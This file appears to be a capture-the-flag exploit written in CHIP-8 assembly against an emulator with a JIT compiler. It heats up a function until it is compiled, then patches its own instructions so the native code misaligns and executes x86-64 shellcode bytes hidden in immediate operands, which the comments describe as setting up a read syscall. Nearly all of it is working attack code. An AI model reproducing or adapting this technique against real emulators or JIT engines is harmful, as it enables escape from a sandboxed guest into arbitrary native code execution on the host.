; Instructions:
; 50    push rax
; 5F    pop  rdi
;
; Compiled instruction lengths (for playing with offsets):
; Ld_reg_imm (on V1) = 5
; Ld_I_imm = 7
; And_reg_reg, Ld_reg_reg (with nonzero disps) = 8
; Shr = 9
; Rnd (on V1) = 18
; Cls = 44

define finalStepReg V6
define zeroreg V7
define onereg V8
define shouldDelayReg V9
define heatuploopctr VA
define scratch0 VB
define scratch1 VC
define scratch2 VD
define junkreg VE

jp start

funcToJit:
    jp delaySection ; Just jump past the padding

    ; Pad
    cls
    ld I, #012
    rndToLdImm:
    rnd v1, #11
    andRegRegToLdImm:
    and V1, V1

    loadLoader:
    ld [I], VF

    jp cutoff ; Jump to the end - we will be calling this function again.
    ; This area (until the label) junk, and will never be executed
    ldImmToRnd:
    ld V1, #11 ; Change to rnd

    ldImmToAndRegReg:
    ld V1, #11

    ;Junk area
    shr scratch0
    ldRegImmToChangeToLdI:
    ; This instruction will be changed to ld I, imm, to increase size by 2 bytes
    ld scratch0, 0
    add junkreg, junkreg
    jmpToAfterMismatch:
    ld junkreg, #5f
    ld I, #012
    smallJmpTarget:

    ; Jmp 0xf bytes forward (jmp imm8 = 0xeb imm8)
    ld I, #feb
    firstjmp:

    ; Jmp 0xd bytes forward
    ld I, #deb
    secondjmp:
    cutoff:
    jp smallJmpTarget
    jp smallJmpTarget
    jp smallJmpTarget
    ; 50    push rax
    ld junkreg, #50
    ; 5F    pop  rdi
    ld junkreg, #5f

    add finalStepReg, 1
    sne finalStepReg, 2
    jp secondjmp

    ; Load registers with shellcode
    ld V0, #50
    ld V1, #5e
    ld V2, #48
    ld V3, #31
    ld V4, #c0
    ld V5, #48
    ld V6, #31
    ld V7, #ff
    ld V8, #ba
    ld V9, #00
    ld Va, #01
    ld Vb, #00
    ld Vc, #00
    ld Vd, #0f
    ld Ve, #05
    ; Ensure function isn't marked as dirty
    ld I, #e00

    jp loadLoader

    delaySection:

    se shouldDelayReg, 1
    jp afterdelay

    ld scratch0, #0

    firstDelay:
        ld scratch1, #0
        secondDelay:

            ld scratch2, #0
            thirdDelay:
                add scratch2, 1
                se scratch2, #ff
                jp thirdDelay

            add scratch1, 1
            se scratch1, #ff
            jp secondDelay

        add scratch0, 1
        se scratch0, #ff
        jp firstDelay

    ld finalStepReg, 1
    jp firstjmp
    afterdelay:
    ret

start:
    ld finalStepReg, 0
    ld heatuploopctr, 0
    ld zeroreg, 0
    ld onereg, 1
    ld shouldDelayReg, 0
    heatupLoop:
        call funcToJit
        add heatuploopctr, 1
        se heatuploopctr, 12
        jp heatupLoop

    ld I, cutoff
    ld V0, 0
    ld V1, #ee ; 00EE is the opcode of "ret"
    ld [I], V1

    ld I, ldRegImmToChangeToLdI
    ld V0, #AA
    ld V1, #00 ; AA00 is the opcode of "ld I, ..."
    ld [I], V1

    ld I, funcToJit
    ld V0, #12
    ld V1, #08 ; Replace jmp with equally sized instruction so that it would compile
    ld [I], V1

    ld I, ldImmToRnd
    ld V0, #C1
    ld V1, #11 ; Rnd
    ld [I], V1

    ld I, rndToLdImm
    ld V0, #61
    ld V1, #11 ; Ld Imm
    ld [I], V1

    ld I, andRegRegToLdImm
    ld [I], V1

    ld I, ldImmToAndRegReg
    ld V0, #81
    ld V1, #12
    ld [I], V1

    ld shouldDelayReg, 1
    call funcToJit

    ; Call again for read syscall
    call funcToJit

    dontdie:
        jp dontdie
